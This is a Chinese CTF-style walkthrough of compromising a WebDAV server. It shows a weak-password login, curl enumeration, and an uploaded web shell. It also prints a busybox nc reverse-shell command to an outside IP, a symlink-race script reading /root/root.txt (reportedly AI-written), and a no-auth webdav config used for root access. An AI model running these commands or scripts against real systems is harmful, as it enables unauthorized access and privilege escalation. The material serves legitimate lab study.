弱口令 `admin : qwertyuiop`

![image-20260309132414318](/assets/img/posts/dva/image-20260309132414318.png)

一开始尝试写一个php，但是访问不到，看phpinfo和网页描述，大概是这样

```
WebDAV 存储目录 = /var/lib/webdav
Apache Web 根 = /var/www/dev
```

尝试枚举目录，发现源码仓库

```
curl -u admin:qwertyuiop -X PROPFIND http://dev.dav.dsz:6065/projects/
curl -u admin:qwertyuiop http://dev.dav.dsz:6065/projects/webapp-api/.env.example
curl -u admin:qwertyuiop http://dev.dav.dsz:6065/projects/webapp-api/README.md
```

![image-20260309133247445](/assets/img/posts/dva/image-20260309133247445.png)



还有一个test，发现就是一个明文的 phpinfo，想到刚刚的test.php，难道这两个目录存在什么映射关系？但是我刚刚尝试写了一个在6065写了一个shell，为什么我还是访问不到呢

既然我写新的不行，那我把已经有的test改成我自己的shell总行了吧

![image-20260309134811728](/assets/img/posts/dva/image-20260309134811728.png)

很神奇的是，过一会test就会变回去，所以弹shell要抓紧时间

```
curl -u admin:qwertyuiop -T shell http://dev.dav.dsz:6065/test

curl "http://dev.dav.dsz/test.php?cmd=busybox+nc+192.168.32.142+5555+-e+/bin/sh"
```

用pspy监听一下，发现很可能是root的crontab，同时也解释了前面test和test.php的关系

![image-20260309142926141](/assets/img/posts/dva/image-20260309142926141.png)

我当时和ai讲，我说能不能劫持这个定时任务，然后通过硬链接的方式写文件，就让ai写了个替换sudoers的脚本，结果没写进去，反倒是在 http://dev.dav.dsz:6065/test/ 把sudoers读出来了，看到其实是用户有一个sudo的权限，我这估计就是个非预期了。我就想着反正有权限先把flag读了，运行脚本后再访问test就能读到flag了

```
#!/bin/bash
# 在一个终端运行监控脚本
while true; do
  # 检测到符号链接后立即替换为恶意文件
  if [ -L /var/lib/webdav/test ]; then
    rm /var/lib/webdav/test
    ln -sf /root/root.txt /var/lib/webdav/test
    echo "[+] Replaced! Waiting for write..."
  fi
  sleep 1
done
```



好吧原来是密码复用 `nolesss : P@ssw0rd2026!`

可以root权限执行 /usr/local/bin/webdav 

-h看一下，可以指定配置文件

```yaml
address: 0.0.0.0
port: 9999

directory: /
permissions: CRUD
auth: false
```
